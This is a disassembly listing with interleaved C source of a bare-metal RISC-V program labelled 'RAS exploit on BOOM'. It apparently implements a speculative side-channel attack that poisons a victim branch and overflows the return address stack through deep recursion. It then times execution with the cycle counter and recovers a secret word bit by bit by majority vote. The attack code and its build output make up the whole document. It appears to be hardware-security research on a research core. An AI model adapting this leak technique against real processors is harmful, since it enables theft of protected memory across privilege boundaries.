    80002600:	00001697          	auipc	a3,0x1
    80002604:	a0068693          	add	a3,a3,-1536 # 80003000 <pt>
    80002608:	20078793          	add	a5,a5,512
    8000260c:	00379793          	sll	a5,a5,0x3
    80002610:	00f687b3          	add	a5,a3,a5
    80002614:	00e7b023          	sd	a4,0(a5)
    secret_l3pt[0] = PPN(secret) | data_flag;
    80002618:	003fe797          	auipc	a5,0x3fe
    8000261c:	9e878793          	add	a5,a5,-1560 # 80400000 <secret>
    80002620:	00c7d793          	srl	a5,a5,0xc
    80002624:	00a79793          	sll	a5,a5,0xa
    80002628:	0c77e713          	or	a4,a5,199
    8000262c:	00001697          	auipc	a3,0x1
    80002630:	9d468693          	add	a3,a3,-1580 # 80003000 <pt>
    80002634:	000027b7          	lui	a5,0x2
    80002638:	00f687b3          	add	a5,a3,a5
    8000263c:	00e7b023          	sd	a4,0(a5) # 2000 <threadsense.2+0x1f7c>

    /**********************************************/

    uintptr_t vm_choice = SATP_MODE_CHOICE;
    80002640:	00800793          	li	a5,8
    80002644:	fef43423          	sd	a5,-24(s0)
    uintptr_t satp_value = ((uintptr_t)l1pt >> PGSHIFT)
                          | (vm_choice * (SATP_MODE & ~(SATP_MODE<<1)));
    80002648:	fe843783          	ld	a5,-24(s0)
    8000264c:	03c79713          	sll	a4,a5,0x3c
    uintptr_t satp_value = ((uintptr_t)l1pt >> PGSHIFT)
    80002650:	00001797          	auipc	a5,0x1
    80002654:	9b078793          	add	a5,a5,-1616 # 80003000 <pt>
    80002658:	00c7d793          	srl	a5,a5,0xc
    8000265c:	00f767b3          	or	a5,a4,a5
    80002660:	fef43023          	sd	a5,-32(s0)

    write_csr(satp, satp_value);
    80002664:	fe043783          	ld	a5,-32(s0)
    80002668:	18079073          	csrw	satp,a5
    write_csr(medeleg,
    8000266c:	0000b7b7          	lui	a5,0xb
    80002670:	1557879b          	addw	a5,a5,341 # b155 <threadsense.2+0xb0d1>
    80002674:	30279073          	csrw	medeleg,a5
              (1 << CAUSE_USER_ECALL) |
              (1 << CAUSE_FETCH_PAGE_FAULT) |
              (1 << CAUSE_LOAD_PAGE_FAULT) |
              (1 << CAUSE_STORE_PAGE_FAULT));

    asm volatile("sfence.vma zero, zero");
    80002678:	12000073          	sfence.vma

    return;
    8000267c:	00000013          	nop
}
    80002680:	01813403          	ld	s0,24(sp)
    80002684:	02010113          	add	sp,sp,32
    80002688:	00008067          	ret

000000008000268c <printArray>:
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fdiv.s fa5, fa5, fa4\n"
        "fcvt.lu.s    %[out], fa5, rtz\n"
        : [out]"=r"(tobe1)
    8000268c:	fd010113          	add	sp,sp,-48
    80002690:	02813423          	sd	s0,40(sp)
    80002694:	03010413          	add	s0,sp,48
    80002698:	fea43423          	sd	a0,-24(s0)
    8000269c:	00058793          	mv	a5,a1
    800026a0:	fcc43c23          	sd	a2,-40(s0)
    800026a4:	fef42223          	sw	a5,-28(s0)

    if (mustbe0 < tobe1) {
        if (v == 1) {
            infinite();
        }
    } else {
    800026a8:	00000013          	nop
    800026ac:	02813403          	ld	s0,40(sp)
    800026b0:	03010113          	add	sp,sp,48
    800026b4:	00008067          	ret

00000000800026b8 <printDoubleArray>:
        return;
    }

    800026b8:	fd010113          	add	sp,sp,-48
    800026bc:	02813423          	sd	s0,40(sp)
    800026c0:	03010413          	add	s0,sp,48
    800026c4:	fea43423          	sd	a0,-24(s0)
    800026c8:	00058793          	mv	a5,a1
    800026cc:	fcc43c23          	sd	a2,-40(s0)
    800026d0:	fef42223          	sw	a5,-28(s0)

void infinite() {
    infinite();
    /* if (i == 0) */
    /*     return; */
    /* i--; */
    800026d4:	00000013          	nop
    800026d8:	02813403          	ld	s0,40(sp)
    800026dc:	03010113          	add	sp,sp,48
    800026e0:	00008067          	ret

00000000800026e4 <verify>:

    /* infinite(i); */
    /* return; */
    800026e4:	fb010113          	add	sp,sp,-80
    800026e8:	04813423          	sd	s0,72(sp)
    800026ec:	05010413          	add	s0,sp,80
    800026f0:	00050793          	mv	a5,a0
    800026f4:	fcb43023          	sd	a1,-64(s0)
    800026f8:	fac43c23          	sd	a2,-72(s0)
    800026fc:	fcf42623          	sw	a5,-52(s0)
}

uint64_t nested(uint64_t i, uint64_t idx) {
    80002700:	fe042623          	sw	zero,-20(s0)
    80002704:	0c80006f          	j	800027cc <verify+0xe8>
    uint64_t cycle;

    80002708:	fec42783          	lw	a5,-20(s0)
    8000270c:	00279793          	sll	a5,a5,0x2
    80002710:	fc043703          	ld	a4,-64(s0)
    80002714:	00f707b3          	add	a5,a4,a5
    80002718:	0007a783          	lw	a5,0(a5)
    8000271c:	fef42423          	sw	a5,-24(s0)
    80002720:	fec42783          	lw	a5,-20(s0)
    80002724:	00178793          	add	a5,a5,1
    80002728:	00279793          	sll	a5,a5,0x2
    8000272c:	fc043703          	ld	a4,-64(s0)
    80002730:	00f707b3          	add	a5,a4,a5
    80002734:	0007a783          	lw	a5,0(a5)
    80002738:	fef42223          	sw	a5,-28(s0)
    if (i == 0) {
    8000273c:	fec42783          	lw	a5,-20(s0)
    80002740:	00279793          	sll	a5,a5,0x2
    80002744:	fb843703          	ld	a4,-72(s0)
    80002748:	00f707b3          	add	a5,a4,a5
    8000274c:	0007a783          	lw	a5,0(a5)
    80002750:	fef42023          	sw	a5,-32(s0)
    80002754:	fec42783          	lw	a5,-20(s0)
    80002758:	00178793          	add	a5,a5,1
    8000275c:	00279793          	sll	a5,a5,0x2
    80002760:	fb843703          	ld	a4,-72(s0)
    80002764:	00f707b3          	add	a5,a4,a5
    80002768:	0007a783          	lw	a5,0(a5)
    8000276c:	fcf42e23          	sw	a5,-36(s0)
        victim(1, idx);
    80002770:	fe842783          	lw	a5,-24(s0)
    80002774:	00078713          	mv	a4,a5
    80002778:	fe042783          	lw	a5,-32(s0)
    8000277c:	0007071b          	sext.w	a4,a4
    80002780:	0007879b          	sext.w	a5,a5
    80002784:	00f70a63          	beq	a4,a5,80002798 <verify+0xb4>
    80002788:	fec42783          	lw	a5,-20(s0)
    8000278c:	0017879b          	addw	a5,a5,1
    80002790:	0007879b          	sext.w	a5,a5
    80002794:	0b80006f          	j	8000284c <verify+0x168>

    80002798:	fe442783          	lw	a5,-28(s0)
    8000279c:	00078713          	mv	a4,a5
    800027a0:	fdc42783          	lw	a5,-36(s0)
    800027a4:	0007071b          	sext.w	a4,a4
    800027a8:	0007879b          	sext.w	a5,a5
    800027ac:	00f70a63          	beq	a4,a5,800027c0 <verify+0xdc>
    800027b0:	fec42783          	lw	a5,-20(s0)
    800027b4:	0027879b          	addw	a5,a5,2
    800027b8:	0007879b          	sext.w	a5,a5
    800027bc:	0900006f          	j	8000284c <verify+0x168>
uint64_t nested(uint64_t i, uint64_t idx) {
    800027c0:	fec42783          	lw	a5,-20(s0)
    800027c4:	0027879b          	addw	a5,a5,2
    800027c8:	fef42623          	sw	a5,-20(s0)
    800027cc:	fcc42783          	lw	a5,-52(s0)
    800027d0:	01f7d71b          	srlw	a4,a5,0x1f
    800027d4:	00f707bb          	addw	a5,a4,a5
    800027d8:	4017d79b          	sraw	a5,a5,0x1
    800027dc:	0007879b          	sext.w	a5,a5
    800027e0:	0017979b          	sllw	a5,a5,0x1
    800027e4:	0007871b          	sext.w	a4,a5
    800027e8:	fec42783          	lw	a5,-20(s0)
    800027ec:	0007879b          	sext.w	a5,a5
    800027f0:	f0e7cce3          	blt	a5,a4,80002708 <verify+0x24>
        asm volatile("csrr %0, cycle"
                     : "=r"(cycle));
    800027f4:	fcc42783          	lw	a5,-52(s0)
    800027f8:	0017f793          	and	a5,a5,1
    800027fc:	0007879b          	sext.w	a5,a5
    80002800:	04078463          	beqz	a5,80002848 <verify+0x164>
    80002804:	fcc42783          	lw	a5,-52(s0)
    80002808:	00279793          	sll	a5,a5,0x2
    8000280c:	ffc78793          	add	a5,a5,-4
    80002810:	fc043703          	ld	a4,-64(s0)
    80002814:	00f707b3          	add	a5,a4,a5
    80002818:	0007a783          	lw	a5,0(a5)
    8000281c:	0007869b          	sext.w	a3,a5
    80002820:	fcc42783          	lw	a5,-52(s0)
    80002824:	00279793          	sll	a5,a5,0x2
    80002828:	ffc78793          	add	a5,a5,-4
    8000282c:	fb843703          	ld	a4,-72(s0)
    80002830:	00f707b3          	add	a5,a4,a5
    80002834:	0007a783          	lw	a5,0(a5)
    80002838:	00068713          	mv	a4,a3
    8000283c:	00f70663          	beq	a4,a5,80002848 <verify+0x164>
        return cycle;
    80002840:	fcc42783          	lw	a5,-52(s0)
    80002844:	0080006f          	j	8000284c <verify+0x168>
    }
    80002848:	00000793          	li	a5,0
    i--;
    8000284c:	00078513          	mv	a0,a5
    80002850:	04813403          	ld	s0,72(sp)
    80002854:	05010113          	add	sp,sp,80
    80002858:	00008067          	ret

000000008000285c <verifyDouble>:

    cycle = nested(i, idx);
    return cycle;
    8000285c:	fa010113          	add	sp,sp,-96
    80002860:	04813c23          	sd	s0,88(sp)
    80002864:	06010413          	add	s0,sp,96
    80002868:	00050793          	mv	a5,a0
    8000286c:	fab43823          	sd	a1,-80(s0)
    80002870:	fac43423          	sd	a2,-88(s0)
    80002874:	faf42e23          	sw	a5,-68(s0)
}

int main(void) {
    80002878:	fe042623          	sw	zero,-20(s0)
    8000287c:	0dc0006f          	j	80002958 <verifyDouble+0xfc>
    uint64_t sec = 0xdeadbeef;
    uint8_t bits[S_WORD] = {0, };
    80002880:	fec42783          	lw	a5,-20(s0)
    80002884:	00379793          	sll	a5,a5,0x3
    80002888:	fb043703          	ld	a4,-80(s0)
    8000288c:	00f707b3          	add	a5,a4,a5
    80002890:	0007b787          	fld	fa5,0(a5)
    80002894:	fef43027          	fsd	fa5,-32(s0)
    80002898:	fec42783          	lw	a5,-20(s0)
    8000289c:	00178793          	add	a5,a5,1
    800028a0:	00379793          	sll	a5,a5,0x3
    800028a4:	fb043703          	ld	a4,-80(s0)
    800028a8:	00f707b3          	add	a5,a4,a5
    800028ac:	0007b787          	fld	fa5,0(a5)
    800028b0:	fcf43c27          	fsd	fa5,-40(s0)
    uint8_t votes[S_WORD] = {0, };
    800028b4:	fec42783          	lw	a5,-20(s0)
    800028b8:	00379793          	sll	a5,a5,0x3
    800028bc:	fa843703          	ld	a4,-88(s0)
    800028c0:	00f707b3          	add	a5,a4,a5
    800028c4:	0007b787          	fld	fa5,0(a5)
    800028c8:	fcf43827          	fsd	fa5,-48(s0)
    800028cc:	fec42783          	lw	a5,-20(s0)
    800028d0:	00178793          	add	a5,a5,1
    800028d4:	00379793          	sll	a5,a5,0x3
    800028d8:	fa843703          	ld	a4,-88(s0)
    800028dc:	00f707b3          	add	a5,a4,a5
    800028e0:	0007b787          	fld	fa5,0(a5)
    800028e4:	fcf43427          	fsd	fa5,-56(s0)

    800028e8:	fe043707          	fld	fa4,-32(s0)
    800028ec:	fd043787          	fld	fa5,-48(s0)
    800028f0:	a2f727d3          	feq.d	a5,fa4,fa5
    800028f4:	00f037b3          	snez	a5,a5
    800028f8:	0ff7f793          	zext.b	a5,a5
    800028fc:	fcf42223          	sw	a5,-60(s0)
    80002900:	fd843707          	fld	fa4,-40(s0)
    80002904:	fc843787          	fld	fa5,-56(s0)
    80002908:	a2f727d3          	feq.d	a5,fa4,fa5
    8000290c:	00f037b3          	snez	a5,a5
    80002910:	0ff7f793          	zext.b	a5,a5
    80002914:	fcf42023          	sw	a5,-64(s0)
    uint64_t start, end;
    80002918:	fc442783          	lw	a5,-60(s0)
    8000291c:	00078713          	mv	a4,a5
    80002920:	fc042783          	lw	a5,-64(s0)
    80002924:	00f777b3          	and	a5,a4,a5
    80002928:	0007879b          	sext.w	a5,a5
    8000292c:	02079063          	bnez	a5,8000294c <verifyDouble+0xf0>
    80002930:	fec42783          	lw	a5,-20(s0)
    80002934:	0017879b          	addw	a5,a5,1
    80002938:	0007879b          	sext.w	a5,a5
    8000293c:	fc442703          	lw	a4,-60(s0)
    80002940:	00f707bb          	addw	a5,a4,a5
    80002944:	0007879b          	sext.w	a5,a5
    80002948:	08c0006f          	j	800029d4 <verifyDouble+0x178>
int main(void) {
    8000294c:	fec42783          	lw	a5,-20(s0)
    80002950:	0027879b          	addw	a5,a5,2
    80002954:	fef42623          	sw	a5,-20(s0)
    80002958:	fbc42783          	lw	a5,-68(s0)
    8000295c:	01f7d71b          	srlw	a4,a5,0x1f
    80002960:	00f707bb          	addw	a5,a4,a5
    80002964:	4017d79b          	sraw	a5,a5,0x1
    80002968:	0007879b          	sext.w	a5,a5
    8000296c:	0017979b          	sllw	a5,a5,0x1
    80002970:	0007871b          	sext.w	a4,a5
    80002974:	fec42783          	lw	a5,-20(s0)
    80002978:	0007879b          	sext.w	a5,a5
    8000297c:	f0e7c2e3          	blt	a5,a4,80002880 <verifyDouble+0x24>

    printf("[*] RAS exploit on BOOM\n");
    80002980:	fbc42783          	lw	a5,-68(s0)
    80002984:	0017f793          	and	a5,a5,1
    80002988:	0007879b          	sext.w	a5,a5
    8000298c:	04078263          	beqz	a5,800029d0 <verifyDouble+0x174>
    80002990:	fbc42783          	lw	a5,-68(s0)
    80002994:	00379793          	sll	a5,a5,0x3
    80002998:	ff878793          	add	a5,a5,-8
    8000299c:	fb043703          	ld	a4,-80(s0)
    800029a0:	00f707b3          	add	a5,a4,a5
    800029a4:	0007b707          	fld	fa4,0(a5)
    800029a8:	fbc42783          	lw	a5,-68(s0)
    800029ac:	00379793          	sll	a5,a5,0x3
    800029b0:	ff878793          	add	a5,a5,-8
    800029b4:	fa843703          	ld	a4,-88(s0)
    800029b8:	00f707b3          	add	a5,a4,a5
    800029bc:	0007b787          	fld	fa5,0(a5)
    800029c0:	a2f727d3          	feq.d	a5,fa4,fa5
    800029c4:	00079663          	bnez	a5,800029d0 <verifyDouble+0x174>

    800029c8:	fbc42783          	lw	a5,-68(s0)
    800029cc:	0080006f          	j	800029d4 <verifyDouble+0x178>
    for (int idx = S_WORD - 1; idx >= 0; idx--) {
    800029d0:	00000793          	li	a5,0
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
    800029d4:	00078513          	mv	a0,a5
    800029d8:	05813403          	ld	s0,88(sp)
    800029dc:	06010113          	add	sp,sp,96
    800029e0:	00008067          	ret

00000000800029e4 <barrier>:
        uint64_t cycles[TRIAL] = {0, };
        for (int t = 0; t < TRIAL; t++) {

    800029e4:	fe010113          	add	sp,sp,-32
    800029e8:	00813c23          	sd	s0,24(sp)
    800029ec:	02010413          	add	s0,sp,32
    800029f0:	00050793          	mv	a5,a0
    800029f4:	fef42623          	sw	a5,-20(s0)
            /* Poison branch in victim */
            for (int i = 0; i < 5; i++)
                victim(0, 0);

            start = nested(64, idx);
    800029f8:	0ff0000f          	fence
            asm volatile("csrr %0, cycle"
                         : "=r"(end));
    800029fc:	08422783          	lw	a5,132(tp) # 84 <threadsense.2>
    80002a00:	0017b793          	seqz	a5,a5
    80002a04:	0ff7f793          	zext.b	a5,a5
    80002a08:	0007871b          	sext.w	a4,a5
    80002a0c:	08e22223          	sw	a4,132(tp) # 84 <threadsense.2>
            cycles[t] = end - start;
    80002a10:	00003797          	auipc	a5,0x3
    80002a14:	5f078793          	add	a5,a5,1520 # 80006000 <count.1>
    80002a18:	00100713          	li	a4,1
    80002a1c:	0f50000f          	fence	iorw,ow
    80002a20:	04e7a6af          	amoadd.w.aq	a3,a4,(a5)
    80002a24:	0006879b          	sext.w	a5,a3
    80002a28:	0007871b          	sext.w	a4,a5
    80002a2c:	fec42783          	lw	a5,-20(s0)
    80002a30:	fff7879b          	addw	a5,a5,-1
    80002a34:	0007879b          	sext.w	a5,a5
    80002a38:	02f71263          	bne	a4,a5,80002a5c <barrier+0x78>
            printf("%4ld ", cycles[t]);
        }
    80002a3c:	00003797          	auipc	a5,0x3
    80002a40:	5c478793          	add	a5,a5,1476 # 80006000 <count.1>
    80002a44:	0007a023          	sw	zero,0(a5)

    80002a48:	08422703          	lw	a4,132(tp) # 84 <threadsense.2>
    80002a4c:	00003797          	auipc	a5,0x3
    80002a50:	5b878793          	add	a5,a5,1464 # 80006004 <sense.0>
    80002a54:	00e7a023          	sw	a4,0(a5)
    80002a58:	0200006f          	j	80002a78 <barrier+0x94>
        int sum = 0;
        for (int t = 0; t < TRIAL; t++) {
    80002a5c:	00000013          	nop
    80002a60:	00003797          	auipc	a5,0x3
    80002a64:	5a478793          	add	a5,a5,1444 # 80006004 <sense.0>
    80002a68:	0007a783          	lw	a5,0(a5)
    80002a6c:	0007871b          	sext.w	a4,a5
    80002a70:	08422783          	lw	a5,132(tp) # 84 <threadsense.2>
    80002a74:	fef716e3          	bne	a4,a5,80002a60 <barrier+0x7c>
            if (cycles[t] > 560)
                sum++;
        }
    80002a78:	0ff0000f          	fence

    80002a7c:	00000013          	nop
    80002a80:	01813403          	ld	s0,24(sp)
    80002a84:	02010113          	add	sp,sp,32
    80002a88:	00008067          	ret

0000000080002a8c <lfsr>:
        bits[idx] = (sum > TRIAL/2)? 1:0;
        votes[idx] = (sum > TRIAL/2)? sum: TRIAL - sum;

    80002a8c:	fd010113          	add	sp,sp,-48
    80002a90:	02813423          	sd	s0,40(sp)
    80002a94:	03010413          	add	s0,sp,48
    80002a98:	fca43c23          	sd	a0,-40(s0)
        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
    80002a9c:	fd843783          	ld	a5,-40(s0)
    80002aa0:	0017d713          	srl	a4,a5,0x1
    80002aa4:	fd843783          	ld	a5,-40(s0)
    80002aa8:	00f747b3          	xor	a5,a4,a5
    80002aac:	0017f793          	and	a5,a5,1
    80002ab0:	fef43423          	sd	a5,-24(s0)
    }
    80002ab4:	fd843783          	ld	a5,-40(s0)
    80002ab8:	0017d713          	srl	a4,a5,0x1
    80002abc:	fe843783          	ld	a5,-24(s0)
    80002ac0:	03e79793          	sll	a5,a5,0x3e
    80002ac4:	00f767b3          	or	a5,a4,a5

    80002ac8:	00078513          	mv	a0,a5
    80002acc:	02813403          	ld	s0,40(sp)
    80002ad0:	03010113          	add	sp,sp,48
    80002ad4:	00008067          	ret

0000000080002ad8 <lfsr10>:
    // printf("[*] Secret: 0x");
    // for (int idx = S_WORD - 4; idx >= 0; idx-=4) {
    //     uint16_t hex = bits[idx+3] << 3 | bits[idx+2] << 2 | bits[idx+1] << 1 | bits[idx];
    80002ad8:	fd010113          	add	sp,sp,-48
    80002adc:	02813423          	sd	s0,40(sp)
    80002ae0:	03010413          	add	s0,sp,48
    80002ae4:	fca43c23          	sd	a0,-40(s0)
    //     printf("%x", hex);
    80002ae8:	fd843783          	ld	a5,-40(s0)
    80002aec:	00a7d713          	srl	a4,a5,0xa
    80002af0:	fd843783          	ld	a5,-40(s0)
    80002af4:	00f747b3          	xor	a5,a4,a5
    80002af8:	3ff7f793          	and	a5,a5,1023
    80002afc:	fef43423          	sd	a5,-24(s0)
    // }
    80002b00:	fd843783          	ld	a5,-40(s0)
    80002b04:	00a7d713          	srl	a4,a5,0xa
    80002b08:	fe843783          	ld	a5,-24(s0)
    80002b0c:	03579793          	sll	a5,a5,0x35
    80002b10:	00f767b3          	or	a5,a4,a5
    // printf("\n");
    80002b14:	00078513          	mv	a0,a5
    80002b18:	02813403          	ld	s0,40(sp)
    80002b1c:	03010113          	add	sp,sp,48
    80002b20:	00008067          	ret

Disassembly of section .data:

0000000080002b40 <benign>:
uint8_t benign[] = "absolute";
    80002b40:	6261                	.2byte	0x6261
    80002b42:	756c6f73          	csrrs	t5,0x756,24
    80002b46:	6574                	.2byte	0x6574
	...

Disassembly of section .bss:

0000000080002b80 <count.2>:
}

static void __attribute__((noinline)) barrier(int ncores)
{
  static volatile int sense;
  static volatile int count;
    80002b80:	0000                	.2byte	0x0
	...

0000000080002b84 <sense.1>:
	...

0000000080003000 <pt>:
	...

0000000080006000 <count.1>:
    80006000:	0000                	.2byte	0x0
	...

0000000080006004 <sense.0>:
  static volatile int sense;
    80006004:	0000                	.2byte	0x0
	...

Disassembly of section .text.attack:

0000000080200000 <attack>:

    .section ".text.attack"
    .global attack
    .align 2
attack:
    call main
    80200000:	16c000ef          	jal	8020016c <main>

0000000080200004 <attack_end>:
attack_end:
    la t0, stvec_handler
    80200004:	ffe00297          	auipc	t0,0xffe00
    80200008:	01828293          	add	t0,t0,24 # 8000001c <stvec_handler>
    jr t0
    8020000c:	00028067          	jr	t0

0000000080200010 <victim>:
void victim(uint64_t mustbe0, uint64_t idx) {
    80200010:	fc010113          	add	sp,sp,-64
    80200014:	02113c23          	sd	ra,56(sp)
    80200018:	02813823          	sd	s0,48(sp)
    8020001c:	04010413          	add	s0,sp,64
    80200020:	fca43423          	sd	a0,-56(s0)
    80200024:	fcb43023          	sd	a1,-64(s0)
    volatile uint64_t s = (uint64_t) (*(uint64_t *) secret);
    80200028:	00200797          	auipc	a5,0x200
    8020002c:	fd878793          	add	a5,a5,-40 # 80400000 <secret>
    80200030:	0007b783          	ld	a5,0(a5)
    80200034:	fef43423          	sd	a5,-24(s0)
    volatile uint64_t tobe1 = 16, two = 2;
    80200038:	01000793          	li	a5,16
    8020003c:	fef43023          	sd	a5,-32(s0)
    80200040:	00200793          	li	a5,2
    80200044:	fcf43c23          	sd	a5,-40(s0)
    volatile uint64_t v = ((((-mustbe0) & s) >> idx) & 1);
    80200048:	fc843783          	ld	a5,-56(s0)
    8020004c:	40f00733          	neg	a4,a5
    80200050:	fe843783          	ld	a5,-24(s0)
    80200054:	00f777b3          	and	a5,a4,a5
    80200058:	fc043703          	ld	a4,-64(s0)
    8020005c:	0007071b          	sext.w	a4,a4
    80200060:	00e7d7b3          	srl	a5,a5,a4
    80200064:	0017f793          	and	a5,a5,1
    80200068:	fcf43823          	sd	a5,-48(s0)
    asm("fence\n"
    8020006c:	fe043783          	ld	a5,-32(s0)
    80200070:	fd843703          	ld	a4,-40(s0)
    80200074:	0ff0000f          	fence
    80200078:	d0377753          	fcvt.s.lu	fa4,a4
    8020007c:	d037f7d3          	fcvt.s.lu	fa5,a5
    80200080:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80200084:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80200088:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8020008c:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80200090:	c03797d3          	fcvt.lu.s	a5,fa5,rtz
    80200094:	fef43023          	sd	a5,-32(s0)
    if (mustbe0 < tobe1) {
    80200098:	fe043783          	ld	a5,-32(s0)
    8020009c:	fc843703          	ld	a4,-56(s0)
    802000a0:	00f77c63          	bgeu	a4,a5,802000b8 <victim+0xa8>
        if (v == 1) {
    802000a4:	fd043703          	ld	a4,-48(s0)
    802000a8:	00100793          	li	a5,1
    802000ac:	00f71a63          	bne	a4,a5,802000c0 <victim+0xb0>
            infinite();
    802000b0:	024000ef          	jal	802000d4 <infinite>
    return;
    802000b4:	00c0006f          	j	802000c0 <victim+0xb0>
        return;
    802000b8:	00000013          	nop
    802000bc:	0080006f          	j	802000c4 <victim+0xb4>
    return;
    802000c0:	00000013          	nop
}
    802000c4:	03813083          	ld	ra,56(sp)
    802000c8:	03013403          	ld	s0,48(sp)
    802000cc:	04010113          	add	sp,sp,64
    802000d0:	00008067          	ret

00000000802000d4 <infinite>:
void infinite() {
    802000d4:	ff010113          	add	sp,sp,-16
    802000d8:	00113423          	sd	ra,8(sp)
    802000dc:	00813023          	sd	s0,0(sp)
    802000e0:	01010413          	add	s0,sp,16
    infinite();
    802000e4:	ff1ff0ef          	jal	802000d4 <infinite>
}
    802000e8:	00000013          	nop
    802000ec:	00813083          	ld	ra,8(sp)
    802000f0:	00013403          	ld	s0,0(sp)
    802000f4:	01010113          	add	sp,sp,16
    802000f8:	00008067          	ret

00000000802000fc <nested>:
uint64_t nested(uint64_t i, uint64_t idx) {
    802000fc:	fd010113          	add	sp,sp,-48
    80200100:	02113423          	sd	ra,40(sp)
    80200104:	02813023          	sd	s0,32(sp)
    80200108:	03010413          	add	s0,sp,48
    8020010c:	fca43c23          	sd	a0,-40(s0)
    80200110:	fcb43823          	sd	a1,-48(s0)
    if (i == 0) {
    80200114:	fd843783          	ld	a5,-40(s0)
    80200118:	02079063          	bnez	a5,80200138 <nested+0x3c>
        victim(1, idx);
    8020011c:	fd043583          	ld	a1,-48(s0)
    80200120:	00100513          	li	a0,1
    80200124:	eedff0ef          	jal	80200010 <victim>
        asm volatile("csrr %0, cycle"
    80200128:	c00027f3          	rdcycle	a5
    8020012c:	fef43423          	sd	a5,-24(s0)
        return cycle;
    80200130:	fe843783          	ld	a5,-24(s0)
    80200134:	0240006f          	j	80200158 <nested+0x5c>
    i--;
    80200138:	fd843783          	ld	a5,-40(s0)
    8020013c:	fff78793          	add	a5,a5,-1
    80200140:	fcf43c23          	sd	a5,-40(s0)
    cycle = nested(i, idx);
    80200144:	fd043583          	ld	a1,-48(s0)
    80200148:	fd843503          	ld	a0,-40(s0)
    8020014c:	fb1ff0ef          	jal	802000fc <nested>
    80200150:	fea43423          	sd	a0,-24(s0)
    return cycle;
    80200154:	fe843783          	ld	a5,-24(s0)
}
    80200158:	00078513          	mv	a0,a5
    8020015c:	02813083          	ld	ra,40(sp)
    80200160:	02013403          	ld	s0,32(sp)
    80200164:	03010113          	add	sp,sp,48
    80200168:	00008067          	ret

000000008020016c <main>:
int main(void) {
    8020016c:	f4010113          	add	sp,sp,-192
    80200170:	0a113c23          	sd	ra,184(sp)
    80200174:	0a813823          	sd	s0,176(sp)
    80200178:	0c010413          	add	s0,sp,192
    uint64_t sec = 0xdeadbeef;
    8020017c:	37ab77b7          	lui	a5,0x37ab7
    80200180:	00279793          	sll	a5,a5,0x2
    80200184:	eef78793          	add	a5,a5,-273 # 37ab6eef <threadsense.2+0x37ab6e6b>
    80200188:	fcf43823          	sd	a5,-48(s0)
    uint8_t bits[S_WORD] = {0, };
    8020018c:	f8043423          	sd	zero,-120(s0)
    80200190:	f8043823          	sd	zero,-112(s0)
    80200194:	f8043c23          	sd	zero,-104(s0)
    80200198:	fa043023          	sd	zero,-96(s0)
    uint8_t votes[S_WORD] = {0, };
    8020019c:	f6043423          	sd	zero,-152(s0)
    802001a0:	f6043823          	sd	zero,-144(s0)
    802001a4:	f6043c23          	sd	zero,-136(s0)
    802001a8:	f8043023          	sd	zero,-128(s0)
    printf("[*] RAS exploit on BOOM\n");
    802001ac:	00000517          	auipc	a0,0x0
    802001b0:	3dc50513          	add	a0,a0,988 # 80200588 <main+0x41c>
    802001b4:	ffe02097          	auipc	ra,0xffe02
    802001b8:	d14080e7          	jalr	-748(ra) # 80001ec8 <printf>
    for (int idx = S_WORD - 1; idx >= 0; idx--) {
    802001bc:	01f00793          	li	a5,31
    802001c0:	fef42623          	sw	a5,-20(s0)
    802001c4:	2100006f          	j	802003d4 <main+0x268>
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
    802001c8:	fec42783          	lw	a5,-20(s0)
    802001cc:	00078713          	mv	a4,a5
    802001d0:	fd043783          	ld	a5,-48(s0)
    802001d4:	00e7d7b3          	srl	a5,a5,a4
    802001d8:	0007879b          	sext.w	a5,a5
    802001dc:	0017f793          	and	a5,a5,1
    802001e0:	0007871b          	sext.w	a4,a5
    802001e4:	fec42783          	lw	a5,-20(s0)
    802001e8:	00070613          	mv	a2,a4
    802001ec:	00078593          	mv	a1,a5
    802001f0:	00000517          	auipc	a0,0x0
    802001f4:	3b850513          	add	a0,a0,952 # 802005a8 <main+0x43c>
    802001f8:	ffe02097          	auipc	ra,0xffe02
    802001fc:	cd0080e7          	jalr	-816(ra) # 80001ec8 <printf>
        uint64_t cycles[TRIAL] = {0, };
    80200200:	f4043023          	sd	zero,-192(s0)
    80200204:	f4043423          	sd	zero,-184(s0)
    80200208:	f4043823          	sd	zero,-176(s0)
    8020020c:	f4043c23          	sd	zero,-168(s0)
    80200210:	f6043023          	sd	zero,-160(s0)
        for (int t = 0; t < TRIAL; t++) {
    80200214:	fe042423          	sw	zero,-24(s0)
    80200218:	0a40006f          	j	802002bc <main+0x150>
            for (int i = 0; i < 5; i++)
    8020021c:	fe042223          	sw	zero,-28(s0)
    80200220:	01c0006f          	j	8020023c <main+0xd0>
                victim(0, 0);
    80200224:	00000593          	li	a1,0
    80200228:	00000513          	li	a0,0
    8020022c:	de5ff0ef          	jal	80200010 <victim>
            for (int i = 0; i < 5; i++)
    80200230:	fe442783          	lw	a5,-28(s0)
    80200234:	0017879b          	addw	a5,a5,1
    80200238:	fef42223          	sw	a5,-28(s0)
    8020023c:	fe442783          	lw	a5,-28(s0)
    80200240:	0007871b          	sext.w	a4,a5
    80200244:	00400793          	li	a5,4
    80200248:	fce7dee3          	bge	a5,a4,80200224 <main+0xb8>
            start = nested(64, idx);
    8020024c:	fec42783          	lw	a5,-20(s0)
    80200250:	00078593          	mv	a1,a5
    80200254:	04000513          	li	a0,64
    80200258:	ea5ff0ef          	jal	802000fc <nested>
    8020025c:	faa43823          	sd	a0,-80(s0)
            asm volatile("csrr %0, cycle"
    80200260:	c00027f3          	rdcycle	a5
    80200264:	faf43423          	sd	a5,-88(s0)
            cycles[t] = end - start;
    80200268:	fa843703          	ld	a4,-88(s0)
    8020026c:	fb043783          	ld	a5,-80(s0)
    80200270:	40f70733          	sub	a4,a4,a5
    80200274:	fe842783          	lw	a5,-24(s0)
    80200278:	00379793          	sll	a5,a5,0x3
    8020027c:	ff078793          	add	a5,a5,-16
    80200280:	008787b3          	add	a5,a5,s0
    80200284:	f4e7b823          	sd	a4,-176(a5)
            printf("%4ld ", cycles[t]);
    80200288:	fe842783          	lw	a5,-24(s0)
